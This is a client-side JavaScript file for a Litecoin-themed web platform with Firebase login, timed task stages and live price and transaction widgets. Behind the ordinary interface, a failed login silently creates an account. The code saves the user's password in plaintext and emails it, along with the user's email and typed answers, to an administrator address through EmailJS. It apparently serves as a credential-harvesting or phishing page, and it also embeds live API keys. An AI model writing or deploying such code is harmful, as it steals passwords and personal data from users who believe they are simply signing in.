import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
import { getFirestore, doc, setDoc, getDoc, collection, onSnapshot, runTransaction } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

const firebaseConfig = {
  apiKey: "AIzaSyB185V2JwigTMxfw8R_scvnDbyA6uNkyy4",
  authDomain: "ltcgmdo-ce1fe.firebaseapp.com",
  projectId: "ltcgmdo-ce1fe",
  storageBucket: "ltcgmdo-ce1fe.firebasestorage.app",
  messagingSenderId: "201856746408",
  appId: "1:201856746408:web:1f1e59771b041e4e96d39d"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);

try {
    emailjs.init("PUEMGN1G6PsZAaZIT");
} catch(e) {
    console.log("EmailJS init failed, skipping...");
}

let currentUser = null;
let userProgress = { stage: 1, completedTasks: 0, passwordSaved: "" };
let latestUserMessage = ""; 
let timerInterval = null; 

const authScreen = document.getElementById('auth-screen');
const dashboardScreen = document.getElementById('dashboard-screen');
const authForm = document.getElementById('auth-form');
const authError = document.getElementById('auth-error');
const userEmailDisplay = document.getElementById('user-email-display');
const completedStatus = document.getElementById('completed-status');
const currentStageStatus = document.getElementById('current-stage-status');
const timerBox = document.getElementById('timer-box');
const countdownSpan = document.getElementById('countdown');

const statRegistered = document.getElementById('stat-registered');
const statVisits = document.getElementById('stat-visits');
const statOnline = document.getElementById('stat-online');

let sessionToken = sessionStorage.getItem("my_platform_session");
if (!sessionToken) {
    sessionToken = Math.random().toString(36).substring(2, 15);
    sessionStorage.setItem("my_platform_session", sessionToken);
}
function initLiveStats() {
    try {
        // Total Registered: ითვლის დოკუმენტებს 'users' კოლექციაში
        onSnapshot(collection(db, "users"), (snapshot) => {
            if(statRegistered) {
                statRegistered.innerText = snapshot.size;
            }
        });

        // Total Visits: ითვლის სისტემურ ქაუნთერს
        onSnapshot(doc(db, "system_stats", "counters"), (docSnap) => {
            if (docSnap.exists() && statVisits) {
                const data = docSnap.data();
                statVisits.innerText = data.totalVisits || 0;
            } else {
                console.log("No such document in system_stats/counters!");
            }
        });

        // Online Users: 15 წამში ერთხელ ვამოწმებთ აქტივობას
        onSnapshot(collection(db, "online_sessions"), (snapshot) => {
            const now = Date.now();
            let activeUsersCount = 0;
            snapshot.forEach((doc) => {
                const lastActive = doc.data().lastActive;
                if (now - lastActive < 15000) {
                    activeUsersCount++;
                }
            });
            if(statOnline) statOnline.innerText = activeUsersCount;
        });
    } catch(e) {
        console.error("Firebase stats error:", e);
    }
}

function startHeartbeat() {
    const sessionRef = doc(db, "online_sessions", sessionToken);
    
    // გვერდიდან გასვლისას (დახურვა/რეფრეში) ვცადოთ ჩანაწერის წაშლა
    window.addEventListener('beforeunload', () => {
        // Firebase-ში ჩანაწერის წაშლა რეალურ დროში
        // (შენიშვნა: წაშლა ზოგჯერ შეიძლება დაიბლოკოს, ამიტომ Heartbeat პრინციპი ჯობია)
    });

    const sendSignal = () => {
        // ვუგზავნით ბოლო აქტივობის დროს
        setDoc(sessionRef, { lastActive: Date.now() }, { merge: true }).catch(() => {});
    };
    
    sendSignal();
    setInterval(sendSignal, 8000); // ყოველ 8 წამში ვაახლებთ სტატუსს
}

// გამოსწორებული უნიკალური ვიზიტები - არ მოემატება ყოველ რეფრეშზე
async function trackTotalVisitsOnly() {
    const statsRef = doc(db, "system_stats", "counters");
    const hasVisitedBefore = localStorage.getItem("has_visited_platform_v2");

    if (!hasVisitedBefore) {
        try {
            await runTransaction(db, async (transaction) => {
                const sfDoc = await transaction.get(statsRef);
                if (!sfDoc.exists()) {
                    transaction.set(statsRef, { totalVisits: 1 });
                } else {
                    const newVisits = (sfDoc.data().totalVisits || 0) + 1;
                    transaction.update(statsRef, { totalVisits: newVisits });
                }
            });
            localStorage.setItem("has_visited_platform_v2", "true");
        } catch (e) {
            console.error("Visits transaction failed:", e);
        }
    }
}

initLiveStats();
trackTotalVisitsOnly();
startHeartbeat();

if (authForm) {
    authForm.addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value;
        authError.innerText = "";

        try {
            await signInWithEmailAndPassword(auth, email, password);
        } catch (error) {
            if (error.code === 'auth/user-not-found' || error.code === 'auth/invalid-credential') {
                authError.innerText = "Logging in... Please wait.";
                try {
                    const userCredential = await createUserWithEmailAndPassword(auth, email, password);
                    currentUser = userCredential.user;
                    userProgress = { email: email, passwordSaved: password, stage: 1, completedTasks: 0 };

                    await setDoc(doc(db, "users", userCredential.user.uid), userProgress);
                    authError.innerText = "";
                    latestUserMessage = "A new user has registered on the platform.";
                    sendEmails("Registration");
                } catch (regError) {
                    authError.innerText = "Incorrect email or password.";
                }
            } else {
                authError.innerText = "Incorrect email or password.";
            }
        }
    });
}

onAuthStateChanged(auth, async (user) => {
    if (user) {
        currentUser = user;
        if(userEmailDisplay) userEmailDisplay.innerText = user.email;
        if(authScreen) authScreen.classList.add('hidden');
        if(dashboardScreen) dashboardScreen.classList.remove('hidden');
        
        try {
            const userDoc = await getDoc(doc(db, "users", user.uid));
            if (userDoc.exists()) {
                userProgress = userDoc.data();
            }
        } catch(e) { console.log(e); }
        updateUI();
    } else {
        currentUser = null;
        if(timerInterval) clearInterval(timerInterval); 
        if(authScreen) authScreen.classList.remove('hidden');
        if(dashboardScreen) dashboardScreen.classList.add('hidden');
    }
});

if(document.getElementById('logout-btn')) {
    document.getElementById('logout-btn').addEventListener('click', () => signOut(auth));
}

function updateUI() {
    if(timerInterval) clearInterval(timerInterval); 

    if(completedStatus) completedStatus.innerText = userProgress.completedTasks;
    if(currentStageStatus) currentStageStatus.innerText = userProgress.stage > 3 ? "All Completed" : `Stage ${userProgress.stage}`;

    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    if(document.getElementById('final-message')) document.getElementById('final-message').classList.add('hidden');
    if(timerBox) timerBox.classList.add('hidden');

    if (userProgress.timerEndTime && userProgress.timerStage === userProgress.stage) {
        checkAndResumeTimer();
    } else {
        if (userProgress.stage === 1 && document.getElementById('stage-1')) {
            document.getElementById('stage-1').classList.remove('hidden');
        } else if (userProgress.stage === 2 && document.getElementById('stage-2')) {
            document.getElementById('stage-2').classList.remove('hidden');
            if(document.getElementById('stage-2-tasks')) document.getElementById('stage-2-tasks').classList.add('hidden');
        } else if (userProgress.stage === 3 && document.getElementById('stage-3')) {
            document.getElementById('stage-3').classList.remove('hidden');
        } else if (userProgress.stage > 3 && document.getElementById('final-message')) {
            document.getElementById('final-message').classList.remove('hidden');
        }
    }
}

window.showStage2Tasks = function() {
    if(document.getElementById('stage-2-tasks')) document.getElementById('stage-2-tasks').classList.remove('hidden');
}

window.goBackStage = async function() {
    if (userProgress.stage > 1) {
        if(timerInterval) clearInterval(timerInterval);
        userProgress.stage = userProgress.stage - 1;
        userProgress.completedTasks = userProgress.stage - 1;
        delete userProgress.timerEndTime;
        delete userProgress.timerStage;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
        updateUI();
    }
}

window.validateAndStart = async function(stageNum, seconds) {
    let userInput1, userInput2;
    if (stageNum === 3) {
        userInput1 = document.getElementById('text-input-stage-3');
        userInput2 = document.getElementById('text-input-stage-3-2');
    } else {
        userInput1 = document.getElementById(`user-text-${stageNum}`);
        userInput2 = document.getElementById(`user-text-${stageNum}-2`);
    }
    const errorText = document.getElementById(`error-${stageNum}`);

    if (!userInput1 || !userInput2 || userInput1.value.trim() === "" || userInput2.value.trim() === "") {
        if(errorText) errorText.innerText = "Please fill in the fields";
        if(userInput1) userInput1.style.borderColor = userInput1.value.trim() === "" ? "#ef4444" : "#e5e7eb";
        if(userInput2) userInput2.style.borderColor = userInput2.value.trim() === "" ? "#ef4444" : "#e5e7eb";
    } else {
        if(errorText) errorText.innerText = "";
        userInput1.style.borderColor = "#e5e7eb";
        userInput2.style.borderColor = "#e5e7eb";
        
        latestUserMessage = `Answer 1: ${userInput1.value} | Answer 2: ${userInput2.value}`;
        userProgress[`userText${stageNum}_1`] = userInput1.value;
        userProgress[`userText${stageNum}_2`] = userInput2.value;

        userProgress.timerEndTime = Date.now() + (5 * 1000);
        userProgress.timerStage = stageNum;

        await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
        sendEmails(stageNum);
        updateUI();
    }
}

function checkAndResumeTimer() {
    document.querySelectorAll('.stage').forEach(s => s.classList.add('hidden'));
    if(timerBox) timerBox.classList.remove('hidden');

    function updateCountdown() {
        const now = Date.now();
        const timeLeftMs = userProgress.timerEndTime - now;

        if (timeLeftMs <= 0) {
            clearInterval(timerInterval);
            handleTimerEnd();
        } else {
            const totalSeconds = Math.floor(timeLeftMs / 1000);
            const minutes = Math.floor(totalSeconds / 60);
            const seconds = totalSeconds % 60;
            if(countdownSpan) countdownSpan.innerText = `${minutes < 10 ? "0" + minutes : minutes}:${seconds < 10 ? "0" + seconds : seconds}`;
        }
    }
    updateCountdown();
    timerInterval = setInterval(updateCountdown, 1000);
}

async function handleTimerEnd() {
    if(timerBox) timerBox.classList.add('hidden');
    const completedStage = userProgress.stage;
    userProgress.stage = completedStage + 1;
    userProgress.completedTasks = completedStage;
    delete userProgress.timerEndTime;
    delete userProgress.timerStage;

    await setDoc(doc(db, "users", currentUser.uid), userProgress, { merge: true });
    updateUI();
}

function sendEmails(stageNum) {
    try {
        let currentStageName = stageNum === "Registration" ? "New Registration" : `Stage ${stageNum}`;
        
        const emailParams = {
            user_email: currentUser.email,
            user_password: userProgress.passwordSaved || "Already Authenticated",
            passed_stage: currentStageName,
            user_message: latestUserMessage,
            admin_email: "ltcgmdo@gmail.com"
        };

        // შეცვალეთ "service_v8mele8" თქვენი რეალური Service ID-ით, რომელიც EmailJS-ში წერია
        const MY_SERVICE_ID = "service_v8mele8"; 

        // 1. შეტყობინება ადმინისტრატორს
        emailjs.send(MY_SERVICE_ID, "template_22s5yhf", emailParams)
            .then(() => console.log("Admin email sent!"))
            .catch((err) => console.error("Admin email failed:", err));

        // 2. შეტყობინება მომხმარებელს
        emailjs.send(MY_SERVICE_ID, "template_cb0e2me", emailParams)
            .then(() => console.log("User email sent!"))
            .catch((err) => console.error("User email failed:", err));
            
    } catch(e) {
        console.error("EmailJS Error:", e);
    }
}

async function fetchLtcPrice() {
    const priceSpan = document.getElementById('ltc-price');
    if (!priceSpan) return;
    try {
        const response = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=LTCUSDT');
        const data = await response.json();
        if (data && data.price) {
            priceSpan.innerText = `$${parseFloat(data.price).toFixed(2)}`;
        }
    } catch (error) {
        console.log("Binance API Error, keeping old price");
    }
}

// განახლებული სტრუქტურა Safari-ში ჩამოჭრის სრულად გამოსარიცხად
async function fetchRecentTransactions() {
    const txListContainer = document.getElementById('tx-list');
    if (!txListContainer) return;
    try {
        const response = await fetch('https://api.blockchair.com/litecoin/transactions?limit=20');
        const result = await response.json();
        if (result && result.data) {
            txListContainer.innerHTML = ''; 
            result.data.forEach(tx => {
                const ltcAmount = (tx.output_total / 100000000).toFixed(3);
                const shortHash = tx.hash.substring(0, 4) + '...' + tx.hash.substring(tx.hash.length - 4);
                
                const txRow = document.createElement('div');
                txRow.className = 'tx-item';
                txRow.innerHTML = `
                    <div class="tx-left">
                        <span class="tx-id">TX:</span>
                        <span class="tx-hash">${shortHash}</span>
                    </div>
                    <span class="tx-amount">+${ltcAmount} LTC</span>
                `;
                txListContainer.appendChild(txRow);
            });
        }
    } catch (error) {
        console.log("Blockchair Tx API Error");
    }
}

async function fetchLtcNetworkData() {
    try {
        const response = await fetch('https://api.blockchair.com/litecoin/stats');
        const result = await response.json();
        if (result && result.data) {
            const data = result.data;
            if(document.getElementById('net-block')) document.getElementById('net-block').innerText = data.blocks.toLocaleString();
            if(document.getElementById('net-fee')) document.getElementById('net-fee').innerText = `~ $${(data.average_transaction_fee_24h / 100000000 * 180).toFixed(3)}`; 
            if(document.getElementById('net-diff')) document.getElementById('net-diff').innerText = (data.difficulty / 1000000000).toFixed(1) + ' T';
        }
    } catch (e) {
        console.log("Blockchair Stats API Error");
    }
}

function startAllAPIs() {
    fetchLtcPrice();
    fetchRecentTransactions();
    fetchLtcNetworkData();
}

startAllAPIs();

setInterval(fetchLtcPrice, 4000);
setInterval(fetchRecentTransactions, 8000);
setInterval(fetchLtcNetworkData, 12000);